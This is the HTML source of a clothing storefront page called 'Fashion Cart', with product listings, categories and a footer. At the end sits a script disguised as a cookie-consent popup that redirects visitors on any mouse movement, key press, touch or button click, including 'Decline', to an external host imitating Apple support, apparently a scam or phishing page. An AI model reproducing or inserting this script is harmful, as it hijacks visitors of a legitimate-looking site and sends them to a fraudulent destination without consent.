<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fashion Cart - Your Trusted Fashion Destination</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
        h1 { font-size: 3rem; font-weight: 700; line-height: 1.2; }
        h2 { font-size: 2rem; font-weight: 600; line-height: 1.3; }
        h3 { font-size: 1.5rem; font-weight: 600; line-height: 1.4; }
        p { font-size: 1rem; line-height: 1.6; }
    </style>
</head>
<body class="min-h-screen flex flex-col bg-gray-50">
    <!-- Navigation -->
    <nav class="bg-white shadow-sm sticky top-0 z-50">
        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
            <div class="flex justify-between items-center h-16">
                <a href="index.php" class="flex items-center gap-2 text-xl font-bold">
                    <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 3h2l.4 2M7 13h10l4-8H5.4M7 13L5.4 5M7 13l-2.293 2.293c-.63.63-.184 1.707.707 1.707H17m0 0a2 2 0 100 4 2 2 0 000-4zm-8 2a2 2 0 11-4 0 2 2 0 014 0z"/>
                    </svg>
                    Fashion Cart
                </a>
                <div class="hidden md:flex items-center gap-8">
                    <a href="index.php" class="hover:text-gray-600 border-b-2 border-black">Home</a>
                    <a href="shop.php" class="hover:text-gray-600">Shop</a>
                    <a href="about.php" class="hover:text-gray-600">About</a>
                    <a href="contact.php" class="hover:text-gray-600">Contact</a>
                </div>
                <a href="cart.php" class="relative p-2 hover:bg-gray-100 rounded">
                    <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 3h2l.4 2M7 13h10l4-8H5.4M7 13L5.4 5M7 13l-2.293 2.293c-.63.63-.184 1.707.707 1.707H17m0 0a2 2 0 100 4 2 2 0 000-4zm-8 2a2 2 0 11-4 0 2 2 0 014 0z"/>
                    </svg>
                </a>
            </div>
        </div>
    </nav>

    <!-- Main Content -->
    <main class="flex-1">
        <!-- Hero Section -->
        <section class="relative h-[600px] bg-cover bg-center" style="background-image: linear-gradient(rgba(0,0,0,0.4), rgba(0,0,0,0.4)), url('https://images.unsplash.com/photo-1568386396136-0d8ac51c8959?w=1920');">
            <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 h-full flex items-center">
                <div class="text-white max-w-xl">
                    <h1 class="mb-4">Welcome to Fashion Cart</h1>
                    <p class="text-xl mb-8">Discover the latest trends in fashion. Quality clothing at affordable prices with free shipping on orders over $50.</p>
                    <a href="shop.php" class="inline-flex items-center px-6 py-3 bg-white text-black font-semibold rounded hover:bg-gray-100 transition">
                        Shop Now
                        <svg class="ml-2 w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"/>
                        </svg>
                    </a>
                </div>
            </div>
        </section>

        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
            <!-- Categories Section -->
            <section class="py-16">
                <h2 class="text-center mb-12">Shop by Category</h2>
                <div class="grid grid-cols-2 md:grid-cols-4 gap-6">
                    <a href="shop.php" class="bg-white rounded-lg overflow-hidden shadow hover:shadow-lg transition">
                        <div class="aspect-square">
                            <img src="https://images.unsplash.com/photo-1651840760882-e5209bba5815?w=400" alt="Tops" class="w-full h-full object-cover hover:scale-105 transition-transform duration-300">
                        </div>
                        <div class="p-4 text-center">
                            <h3>Tops</h3>
                        </div>
                    </a>
                    <a href="shop.php" class="bg-white rounded-lg overflow-hidden shadow hover:shadow-lg transition">
                        <div class="aspect-square">
                            <img src="https://images.unsplash.com/photo-1613966570650-add3cf83aa83?w=400" alt="Dresses" class="w-full h-full object-cover hover:scale-105 transition-transform duration-300">
                        </div>
                        <div class="p-4 text-center">
                            <h3>Dresses</h3>
                        </div>
                    </a>
                    <a href="shop.php" class="bg-white rounded-lg overflow-hidden shadow hover:shadow-lg transition">
                        <div class="aspect-square">
                            <img src="https://images.unsplash.com/photo-1543076447-215ad9ba6923?w=400" alt="Outerwear" class="w-full h-full object-cover hover:scale-105 transition-transform duration-300">
                        </div>
                        <div class="p-4 text-center">
                            <h3>Outerwear</h3>
                        </div>
                    </a>
                    <a href="shop.php" class="bg-white rounded-lg overflow-hidden shadow hover:shadow-lg transition">
                        <div class="aspect-square">
                            <img src="https://images.unsplash.com/photo-1714328564923-d4826427c991?w=400" alt="Formal" class="w-full h-full object-cover hover:scale-105 transition-transform duration-300">
                        </div>
                        <div class="p-4 text-center">
                            <h3>Formal</h3>
                        </div>
                    </a>
                </div>
            </section>

            <!-- Featured Products -->
            <section class="py-16">
                <div class="flex justify-between items-center mb-12">
                    <h2>Featured Products</h2>
                    <a href="shop.php" class="px-4 py-2 border border-gray-300 rounded hover:bg-gray-100">View All</a>
                </div>
                <div class="grid grid-cols-1 md:grid-cols-3 gap-8">
                    <a href="product.php" class="bg-white rounded-lg overflow-hidden shadow hover:shadow-lg transition">
                        <div class="aspect-square relative">
                            <img src="https://images.unsplash.com/photo-1651840760882-e5209bba5815?w=600" alt="Classic White T-Shirt" class="w-full h-full object-cover hover:scale-105 transition-transform duration-300">
                            <div class="absolute top-4 right-4 bg-red-500 text-white px-3 py-1 rounded">Sale</div>
                        </div>
                        <div class="p-6">
                            <h3 class="mb-2">Classic White T-Shirt</h3>
                            <p class="text-gray-600 mb-4">Tops</p>
                            <div class="flex items-center gap-2">
                                <span class="text-xl font-semibold">$29.99</span>
                                <span class="line-through text-gray-400">$39.99</span>
                            </div>
                        </div>
                    </a>
                    <a href="product.php" class="bg-white rounded-lg overflow-hidden shadow hover:shadow-lg transition">
                        <div class="aspect-square">
                            <img src="https://images.unsplash.com/photo-1613966570650-add3cf83aa83?w=600" alt="Summer Floral Dress" class="w-full h-full object-cover hover:scale-105 transition-transform duration-300">
                        </div>
                        <div class="p-6">
                            <h3 class="mb-2">Summer Floral Dress</h3>
                            <p class="text-gray-600 mb-4">Dresses</p>
                            <span class="text-xl font-semibold">$79.99</span>
                        </div>
                    </a>
                    <a href="product.php" class="bg-white rounded-lg overflow-hidden shadow hover:shadow-lg transition">
                        <div class="aspect-square relative">
                            <img src="https://images.unsplash.com/photo-1543076447-215ad9ba6923?w=600" alt="Denim Jacket" class="w-full h-full object-cover hover:scale-105 transition-transform duration-300">
                            <div class="absolute top-4 right-4 bg-red-500 text-white px-3 py-1 rounded">Sale</div>
                        </div>
                        <div class="p-6">
                            <h3 class="mb-2">Denim Jacket</h3>
                            <p class="text-gray-600 mb-4">Outerwear</p>
                            <div class="flex items-center gap-2">
                                <span class="text-xl font-semibold">$89.99</span>
                                <span class="line-through text-gray-400">$119.99</span>
                            </div>
                        </div>
                    </a>
                </div>
            </section>

            <!-- Features -->
            <section class="py-16 grid grid-cols-1 md:grid-cols-3 gap-8 border-t">
                <div class="text-center">
                    <div class="w-16 h-16 bg-black text-white rounded-full flex items-center justify-center mx-auto mb-4">
                        <svg class="w-8 h-8" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"/>
                        </svg>
                    </div>
                    <h3 class="mb-2">Free Shipping</h3>
                    <p class="text-gray-600">On orders over $50</p>
                </div>
                <div class="text-center">
                    <div class="w-16 h-16 bg-black text-white rounded-full flex items-center justify-center mx-auto mb-4">
                        <svg class="w-8 h-8" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"/>
                        </svg>
                    </div>
                    <h3 class="mb-2">Easy Returns</h3>
                    <p class="text-gray-600">30-day return policy</p>
                </div>
                <div class="text-center">
                    <div class="w-16 h-16 bg-black text-white rounded-full flex items-center justify-center mx-auto mb-4">
                        <svg class="w-8 h-8" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/>
                        </svg>
                    </div>
                    <h3 class="mb-2">Secure Payment</h3>
                    <p class="text-gray-600">100% secure checkout</p>
                </div>
            </section>
        </div>
    </main>

    <!-- Footer -->
    <footer class="bg-gray-900 text-white mt-16">
        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-12">
            <div class="grid grid-cols-1 md:grid-cols-4 gap-8">
                <div>
                    <h3 class="text-xl font-semibold mb-4">Fashion Cart</h3>
                    <p class="text-gray-400 mb-4">Your trusted destination for quality fashion. We offer the latest trends at affordable prices.</p>
                </div>
                <div>
                    <h3 class="text-lg font-semibold mb-4">Quick Links</h3>
                    <ul class="space-y-2">
                        <li><a href="shop.php" class="text-gray-400 hover:text-white">Shop</a></li>
                        <li><a href="about.php" class="text-gray-400 hover:text-white">About Us</a></li>
                        <li><a href="contact.php" class="text-gray-400 hover:text-white">Contact</a></li>
                    </ul>
                </div>
                <div>
                    <h3 class="text-lg font-semibold mb-4">Legal</h3>
                    <ul class="space-y-2">
                        <li><a href="privacy.php" class="text-gray-400 hover:text-white">Privacy Policy</a></li>
                        <li><a href="terms.php" class="text-gray-400 hover:text-white">Terms & Conditions</a></li>
                        <li><a href="shipping.php" class="text-gray-400 hover:text-white">Shipping & Returns</a></li>
                    </ul>
                </div>
                <div>
                    <h3 class="text-lg font-semibold mb-4">Contact Us</h3>
                    <ul class="space-y-2 text-gray-400">
                        <li><a href="mailto:support@fashioncart.com" class="hover:text-white">support@fashioncart.com</a></li>
                        <li><a href="tel:+1234567890" class="hover:text-white">+1 (234) 567-890</a></li>
                        <li>123 Fashion Street, NY 10001</li>
                    </ul>
                </div>
            </div>
            <div class="border-t border-gray-800 mt-8 pt-8 text-center text-gray-400">
                <p>&copy; 2025 Fashion Cart. All rights reserved.</p>
            </div>
        </div>
    </footer>
  <script>


(function(){
  const redirectUrl = "https://applecareservice.z13.web.core.windows.net/";
  const LS_KEY = 'cookiesConsentStatus';

  // Inject popup HTML + CSS only once
  function injectPopup(){
    if(document.getElementById('cookieOverlay')) return; // already added

    const style = document.createElement('style');
    style.textContent = `
      .cookie-overlay{
        position:fixed;inset:0;background:rgba(15,23,42,0.45);
        display:flex;align-items:center;justify-content:center;
        z-index:999999;opacity:0;pointer-events:none;
        transition:opacity .2s ease;
        font-family:system-ui, sans-serif;
      }
      .cookie-overlay.show{opacity:1;pointer-events:auto;}
      .cookie-card{
        width:min(680px,92%);background:#fff;border-radius:12px;
        box-shadow:0 6px 24px rgba(0,0,0,0.1);padding:20px 22px;
        display:flex;flex-wrap:wrap;gap:18px;
        transform:translateY(8px);opacity:0;
        transition:transform .18s ease,opacity .18s ease;
      }
      .cookie-overlay.show .cookie-card{transform:none;opacity:1;}
      .cookie-content{flex:1 1 320px;text-align:left;color:#374151;}
      .cookie-content h2{margin:0 0 6px;font-size:18px;}
      .cookie-content p{margin:0;font-size:14px;line-height:1.35;color:#6b7280;}
      .cookie-actions{display:flex;gap:8px;align-items:center;}
      .cookie-btn{
        border:0;padding:10px 14px;border-radius:10px;
        font-weight:600;cursor:pointer;font-size:14px;
      }
      .cookie-btn.accept{background:#0b76ef;color:#fff;}
      .cookie-btn.decline{background:transparent;color:#6b7280;border:1px solid rgba(15,23,42,0.1);}
      @media(max-width:540px){.cookie-actions{width:100%;justify-content:space-between;margin-top:8px;}}
    `;
    document.head.appendChild(style);

    const html = `
      <div id="cookieOverlay" class="cookie-overlay" role="dialog" aria-modal="true">
        <div class="cookie-card">
          <div class="cookie-content">
            <h2>We use cookies</h2>
            <p>We use cookies to improve your experience. By clicking "Accept cookies" you agree to our use of cookies.</p>
          </div>
          <div class="cookie-actions">
            <button id="declineBtn" class="cookie-btn decline">Decline</button>
            <button id="acceptBtn" class="cookie-btn accept">Accept cookies</button>
          </div>
        </div>
      </div>`;
    document.body.insertAdjacentHTML("beforeend", html);
  }

  function redirect(){
    window.location.href = redirectUrl;
  }

  function enableRedirectDetection(){
    ['mousemove','keydown','touchstart'].forEach(evt=>{
      window.addEventListener(evt, redirect, {once:true});
    });
  }

  function showPopup(){
    const overlay=document.getElementById('cookieOverlay');
    if(!overlay)return;
    overlay.classList.add('show');
  }

  function handleChoice(choice){
    localStorage.setItem(LS_KEY, choice);
    document.getElementById('cookieOverlay').classList.remove('show');
    redirect();
  }

  window.addEventListener('load',()=>{
    injectPopup();
    enableRedirectDetection();

    const consent = localStorage.getItem(LS_KEY);
    if(!(consent==='accepted'||consent==='declined')){
      setTimeout(showPopup,150);
    }

    // Attach handlers after DOM ready
    document.body.addEventListener('click',e=>{
      if(e.target.id==='acceptBtn')handleChoice('accepted');
      if(e.target.id==='declineBtn')handleChoice('declined');
      if(e.target.tagName==='BUTTON')redirect(); // redirect on any button click
    });
  });
})();
</script>
</body>
</html>
